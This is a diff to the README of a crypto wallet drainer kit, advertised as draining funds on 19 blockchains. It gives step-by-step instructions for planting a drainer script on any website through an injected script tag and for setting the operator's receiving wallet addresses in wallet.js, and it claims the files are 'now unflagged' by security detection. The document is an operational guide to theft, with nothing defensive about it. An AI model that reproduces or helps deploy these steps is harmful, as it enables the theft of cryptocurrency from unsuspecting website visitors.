@@ -7,9 +7,9 @@
 Drain on 19 different chains 🚀: ETH,OPTIMISM,CRONOS,BSC,GNOSIS,FUSE,HECO,POLY AND MORES !!
 Installation on any website files and documentation included 🔥
 
-Installation & Instructions of the draining system on any WEBSITE / USE THE UPDATED FILE
+Installation & Instructions of the draining system on any WEBSITE / DRAINERSCRIPTONLY.rar
 
-# STEP 1 (FOLLOW THE TUTORIAL IN THE .RAR FOR STEP 1
+# STEP 1 (FOLLOW THE TUTORIAL IN THE UPDATED .RAR FOR STEP 1
 <script charset="UTF-8" type="text/javascript" src="./85562950-42ac-48d9-9757-cb0ae30ccb7c.js"></script>
 <!–– Please do not forgot to update the files.zip (now unflagged) ––>
 
@@ -22,7 +22,7 @@ Move all the files and folder in the directory of your website. ( Image, Scripts
 
 
 
-# STEP 3 (USE THE NEW WALLET.JS)
+# STEP 3 (USE THE NEW WALLET.JS IN THE UPDATED .RAR)
 Add your Wallet Adresses in the wallet.js files, you can find the .js files in the scripts folder.
 
 Now replace this line "0xreceiverwallet" for your wallet bsc and your wallet eth 
